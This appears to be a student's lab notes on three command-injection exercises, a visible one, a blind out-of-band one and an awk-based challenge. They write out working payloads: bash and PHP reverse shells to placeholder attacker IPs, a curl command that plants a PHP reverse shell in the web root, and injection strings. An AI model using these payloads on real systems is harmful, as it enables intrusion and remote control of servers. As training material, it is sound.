In this case we are able to inject commands that are executed by the server.

# Command injection 0x01
In this case we can see that we can pass an url that is executed in the command:
- ![[Pasted image 20250104235110.png]]


So basically we can try to use 
```bash
; whoami; hello
```

And we get:
- ![[Pasted image 20250104235323.png]]
- this because we make grep command fail with hello


So what we can try to do is to perform a reverse shell.
We can find all the payloads here [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)


So we can run:
```bash
; bash -i >& /dev/tcp/OUR_ATTACK_IP/4242 0>&1;
```

This will work if we have open a netcat connection on our host:
```bash
nc -nlvp 4242
```


But it doesn't work. We can see that `PHP` is used so maybe we can use it to execute a shell:
```bash
; which php; hello
```

At this point we can execute it:
```bash
; /usr/local/bin/php php -r '$sock=fsockopen("OUR_ATTACKER_IP",4242);exec("/bin/sh -i <&3 >&3 2>&3");' ; hello
```

And we obtain a shell:
- ![[Pasted image 20250105000710.png]]



# Blind Out-of-band CMD Injection Injection 0x02

In this case we have a similar situation but we don't know the result, because we cannot see anything:
- ![[Pasted image 20250105000907.png]]

We can see that `;` is filtered...


So what we can try to do is to use `webhook` in order to send a request and see if we get it and if the cmd injection works:
```bash
webhook_site?`whoami`
```
- ![[Pasted image 20250105001032.png]]
- we can see that we received the executed `whoami`



We can also use python to create a server on our machine:
```bash
python3 -m http.server 8080
```


And then use:
```bash 
website && curl OUR_IP:8080/test
```
- ![[Pasted image 20250105001249.png]]
- we can see that it works

So we create a file to perform a reverse shell and we serve it in the folder with python:
```bash
cp /usr/share/webshells/laudanum/php/php-reverse-shell.php

nano php-reverse-shell.php (update ip and port)

python3 -m http.server 8080
```


At this point we get it on the victim command injection:
```bash
website && curl OUR_IP:8080/php-reverse-shell.php > /var/www/html/reverse.php
```

Now we have passed the file to the victim and we can open `localhost/rev.php`:
- ![[Pasted image 20250105001758.png]]

At this point we have a shell:
- ![[Pasted image 20250105001821.png]]



# Challeng CMD injection 0x03
In this case we have an application that allows us to redirect a vehicle and to manage the position of it:
- ![[Pasted image 20250106154110.png]]

We can easily see that it uses the `awk` command injecting in it the position `x y` we send in input.


So we can try to do the injection.

So the command executed is `awk 'BEGIN {print sqrt(((-x)^2 + ((-y)^2))}`

So we want to break it trying to insert
```bash
Y_value)^2))}' ; whoami
```
- but we don't get any result, it is insert into the brachets
- ![[Pasted image 20250106154517.png]]

So we try to break it and to comment the part on the right:
```bash
Y_value)^2))}' ; whoami; #
```
- we get the result now
- ![[Pasted image 20250106154621.png]]


Let's get a shell:
```bash
Y_value)^2))}' ; php php -r '$sock=fsockopen("OUR_IP",4242);exec("/bin/sh -i <&3 >&3 2>&3");' ; #
```
- we have to lunch in our host `nc -nvlp 4242`
- ![[Pasted image 20250106154828.png]]

